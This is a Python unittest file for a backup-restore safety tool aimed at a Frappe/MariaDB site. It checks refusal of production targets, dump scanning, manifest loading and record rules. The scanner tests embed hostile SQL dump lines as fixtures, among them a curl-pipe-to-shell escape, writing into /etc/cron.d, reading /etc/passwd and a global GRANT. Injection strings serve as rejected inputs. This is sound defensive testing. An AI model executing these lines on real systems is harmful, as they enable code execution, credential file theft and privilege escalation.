"""Failure cases of the Frappe target that need no sandbox and no network: production refusal,
backup reading and scanning, manifest loading, the Demo Service Request rules, the replay compare."""
import gzip
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "restoreguard"))
import frappe_target as ft  # noqa: E402

CFG = {"source": {"site": "demo.local", "url": "http://70.34.199.143"},
       "test": {"site": "test.local", "url": "http://70.34.199.143:8080"}, "doctype": "Demo Service Request"}
FIELDS = [{"fieldname": "title", "fieldtype": "Data", "options": None, "reqd": 1},
          {"fieldname": "customer", "fieldtype": "Link", "options": "Customer", "reqd": 0},
          {"fieldname": "priority", "fieldtype": "Select", "options": "Low\nMedium\nHigh", "reqd": 0},
          {"fieldname": "estimated_hours", "fieldtype": "Float", "options": None, "reqd": 0},
          {"fieldname": "hourly_rate", "fieldtype": "Currency", "options": None, "reqd": 0},
          {"fieldname": "total_cost", "fieldtype": "Currency", "options": None, "reqd": 0}]
ROW = {"name": "DSR-2026-0001", "title": "Pump", "customer": "Acme", "priority": "High",
       "estimated_hours": 3.0, "hourly_rate": 100.0, "total_cost": 300.0}
DUMP = ("-- MariaDB dump\n/*M!999999\\- enable the sandbox mode */ \n\n"
        "INSERT INTO `tabDemo Service Request` VALUES\n('DSR-1','we load data from the old system');\n"
        "-- Dump completed on 2026-11-27 13:05:57\n")


def _gz(d, name, text=None, raw=None):
    p = Path(d) / name
    p.write_bytes(raw if raw is not None else gzip.compress(text.encode()))
    return p


class ProdRefusal(unittest.TestCase):
    def test_real_config_passes(self):
        self.assertEqual(ft.check_config(json.loads(json.dumps(CFG))), CFG)
        self.assertEqual(ft.config()["test"]["site"], "test.local")

    def test_test_target_on_production_refused(self):
        for test in ({"site": "test.local", "url": "http://70.34.199.143"},  # port 80 by default
                     {"site": "test.local", "url": "http://10.0.0.9:80"},
                     {"site": "test.local", "url": "http://70.34.199.143:80/"},
                     {"site": "demo.local", "url": "http://70.34.199.143:8080"}):
            with self.assertRaisesRegex(ValueError, "refused"):
                ft.check_config({**CFG, "test": test})

    def test_same_host_port_as_production_refused(self):
        cfg = {**CFG, "source": {"site": "erp.prod", "url": "https://erp.example.com"},
               "test": {"site": "erp.test", "url": "https://ERP.example.com:443"}}
        with self.assertRaisesRegex(ValueError, "production host:port"):
            ft.check_config(cfg)

    def test_production_client_cannot_write(self):
        with tempfile.TemporaryDirectory() as d:
            tokens = Path(d) / "t.json"
            tokens.write_text(json.dumps({"demo.local": "k:s", "test.local": "k:s"}))
            src = ft.Site({**CFG, "tokens": str(tokens)}, "source")
            for method in ("POST", "PUT", "DELETE"):
                with self.assertRaises(PermissionError):
                    src.call("/api/resource/Demo%20Service%20Request/DSR-2026-0001", method=method, body={})

    def test_unsafe_doctype_refused(self):
        with self.assertRaisesRegex(ValueError, "doctype"):
            ft.check_config({**CFG, "doctype": "x`; DROP TABLE y; --"})


class Scan(unittest.TestCase):
    def test_good_dump_readable_and_text_in_records_ignored(self):
        with tempfile.TemporaryDirectory() as d:
            ok, tables, findings, err = ft.scan(_gz(d, "a.sql.gz", DUMP))
            self.assertEqual((ok, tables, findings, err), (True, {"Demo Service Request"}, [], ""))

    def test_broken_inputs_unreadable(self):
        with tempfile.TemporaryDirectory() as d:
            raw = gzip.compress(DUMP.encode() * 200)
            cases = {"truncated gz": _gz(d, "t.sql.gz", raw=raw[:len(raw) // 2]),
                     "no trailer": _gz(d, "n.sql.gz", DUMP.split("-- Dump completed")[0]),
                     "random bytes": _gz(d, "r.sql.gz", raw=os.urandom(4096)),
                     "empty": _gz(d, "e.sql.gz", raw=b""),
                     "missing": Path(d) / "missing.sql.gz"}
            for what, path in cases.items():
                ok, *_, err = ft.scan(path)
                self.assertFalse(ok, what)
                self.assertTrue(err, what)

    def test_code_paths_found(self):
        poison = ["SELECT 'x' INTO OUTFILE '/etc/cron.d/x';", "\\! curl http://e.x | sh",
                  "LOAD DATA INFILE '/etc/passwd' INTO TABLE t;", "GRANT ALL ON *.* TO 'u'@'%';",
                  "/*!50003 CREATE DEFINER=`root`@`%` TRIGGER t BEFORE INSERT ON x FOR EACH ROW SET @a=1 */;",
                  "INSTALL SONAME 'ha_connect';"]
        with tempfile.TemporaryDirectory() as d:
            for line in poison:
                ok, _, findings, _ = ft.scan(_gz(d, "p.sql.gz", DUMP.replace("\n\n", f"\n{line}\n", 1)))
                self.assertTrue(ok)
                self.assertEqual(len(findings), 1, line)


class LoadBackup(unittest.TestCase):
    def test_manifest_failures(self):
        good = {"file": "x.sql.gz", "sha256": "0" * 64, "site": "demo.local", "schema_version": "frappe 16",
                "row_counts": {"Demo Service Request": 1}}
        with tempfile.TemporaryDirectory() as d:
            gz = _gz(d, "20261127_140556-demo_local-database.sql.gz", DUMP)
            mpath = Path(d) / "20261127_140556-demo_local-database.json"
            with self.assertRaisesRegex(ValueError, "no manifest"):
                ft.load_backup(gz)
            mpath.write_text("{not json")
            with self.assertRaisesRegex(ValueError, "unreadable"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps({k: v for k, v in good.items() if k != "row_counts"}))
            with self.assertRaisesRegex(ValueError, "lacks row_counts"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps({**good, "row_counts": {"x`) UNION SELECT 1; --": 1}}))
            with self.assertRaisesRegex(ValueError, "unsafe"):
                ft.load_backup(gz)
            mpath.write_text(json.dumps(good))
            rec = ft.load_backup(gz)
            self.assertEqual((rec["id"], rec["kind"]), ("20261127_140556-demo_local-database", "frappe"))
            if os.geteuid() != 0:
                mpath.chmod(0)
                with self.assertRaisesRegex(ValueError, "unreadable"):
                    ft.load_backup(gz)


class Rules(unittest.TestCase):
    def failed(self, rows, existing={"customer": {"Acme"}}):
        return [n for n, ok, _ in ft.rules(FIELDS, rows, existing) if not ok]

    def test_good_row(self):
        self.assertEqual(self.failed([ROW]), [])

    def test_each_rule_catches_its_fault(self):
        cases = {"required: title": {"title": ""},
                 "customer links to an existing Customer": {"customer": "Gone AB"},
                 "priority is one of Low/Medium/High": {"priority": "Urgent"},
                 "total_cost = estimated_hours x hourly_rate": {"total_cost": 3000.0},
                 "estimated_hours > 0, hourly_rate >= 0": {"estimated_hours": 0, "total_cost": 0}}
        for rule, change in cases.items():
            self.assertEqual(self.failed([ROW, {**ROW, "name": "DSR-2026-0002", **change}]), [rule], rule)

    def test_decimal_strings_from_mariadb(self):
        row = {**ROW, "estimated_hours": "3.000000000", "hourly_rate": "100.000000000", "total_cost": "300.000000000"}
        self.assertEqual(self.failed([row]), [])


class Compare(unittest.TestCase):
    names = [f["fieldname"] for f in FIELDS]

    def test_same_records_by_name_or_new_name(self):
        got = [{**ROW, "name": "DSR-2026-0007", "estimated_hours": 3}]
        self.assertEqual(ft.compare(self.names, [ROW], got, {"DSR-2026-0001": "DSR-2026-0007"}), [])

    def test_differences(self):
        diffs = ft.compare(self.names, [ROW], [{**ROW, "title": "Changed"}, {**ROW, "name": "DSR-2026-0009"}], {})
        self.assertEqual(len(diffs), 2)
        self.assertEqual(ft.compare(self.names, [ROW], [], {}), ["DSR-2026-0001 missing"])


if __name__ == "__main__":
    unittest.main()
